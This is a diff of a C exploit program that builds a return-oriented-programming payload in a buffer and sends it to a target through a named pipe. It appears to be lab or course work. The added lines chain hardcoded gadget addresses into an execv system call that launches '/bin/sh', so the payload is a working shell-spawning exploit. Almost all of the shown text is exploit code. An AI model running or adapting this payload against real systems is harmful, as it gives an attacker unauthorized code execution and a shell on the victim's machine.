@@ -7,7 +7,7 @@
 
 int main(void)
 {
-  char bufr[700]; // address = 0xbfbf671d
+  char bufr[640]; // address = 0xbfbf671d
   char trap[] = "\xe5\xb6\xa9\xbb";
 
   char pop_eax[] = "\xe1\xa0\xb9\xbb";
@@ -77,6 +77,12 @@ int main(void)
   // #3
   char dup_call3_arg_addr[] = "\x48\x69\xbf\xbf"; // bufr + 547, bfbf693c
 
+  // execv syscall
+  char exec_arg[] = "\x3b\x01\x01\x01";
+  char null_arg_addr[] = "\x88\x69\xbf\xbf"; // bufr + 619, bfbf6988
+  char y_addr[] = "\x8c\x69\xbf\xbf"; // bufr + 623, bfbf698c
+  char null_arg_addr2[] = "\x90\x69\xbf\xbf"; // bufr + 627, bfbf6990
+  char x_addr[] = "\x94\x69\xbf\xbf"; // bufr + 631, bfbf6994
   int i;
   // Fill up buffer
   for(i = 0; i < 131; i++)
@@ -229,7 +235,7 @@ int main(void)
   // 2 dummy calls to avoid null chars
   strcpy(bufr + 471, dummy_ret);
   strcpy(bufr + 475, dummy_ret);
-  // x/24x 0xbfbf6908
+  // x/24x 0xbfbf68fc
   // ---------------------------------------------------------- call #1
   strcpy(bufr + 479, trap); // 0xbba9b6e5, location is 0xbfbf6908
   strcpy(bufr + 483, jump_8); // 0xbbb2d3e2
@@ -265,6 +271,44 @@ int main(void)
   strcpy(bufr + 551, "\x01\x01\x01\x01");
   // 4 byte value 2
   strcpy(bufr + 555, "\x01\x01\x01\x01");
+  //---------------------------------------------------------------------------------------------- execv
+  // pop arg into edx
+  strcpy(bufr + 559, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 563, exec_arg);
+  // clear eax
+  strcpy(bufr + 567, xor_eax); // 0xbba9b3c2
+  // add last 8 bits of edx to eax
+  strcpy(bufr + 571, add_dl_al); // 0xbbbb4607
+                                 // eax now holds 0x3b (59)
+  // clear edx 
+  strcpy(bufr + 575, xor_edx); // 0xbbb3bed4
+  // pop null args address into ecx
+  strcpy(bufr + 579, pop_ecx); // 0xbbbaa422
+  strcpy(bufr + 583, null_arg_addr); // = 0xbfbf67d0
+  // write 4 bytes of null to address in ecx
+  strcpy(bufr + 587, write_at_ecx_from_edx); // 0xbbb6b87e
+                                             // null arg 1 should be present
+  strcpy(bufr + 591, pop_ecx); // 0xbbbaa422           
+  strcpy(bufr + 595, null_arg_addr2); // = 0xbfbf68a4        
+  // write 4 bytes of null to address in ecx
+  strcpy(bufr + 599, write_at_ecx_from_edx); // 0xbbb6b87e
+
+  // trap into kernel
+  strcpy(bufr + 603, trap); // 0xbba9b6e5
+  // leave 4 bytes for the ret call of trap
+  strcpy(bufr + 607, "\x01\x01\x01\x01");
+  // address of "/bin/sh"
+  strcpy(bufr + 611, x_addr);
+  // address of y
+  strcpy(bufr + 615, y_addr);
+  // leave 4 bytes for null arg at bufr + 179
+  strcpy(bufr + 619, "\x01\x01\x01\x01");
+  // start of y
+  strcpy(bufr + 623, x_addr);
+  // second null arg
+  strcpy(bufr + 627, "\x01\x01\x01\x01");
+  // location of "/bin/sh"
+  strcpy(bufr + 631, "/bin/sh\x00");
   writecmd(PIPEPATH, bufr);
   
   return 0;
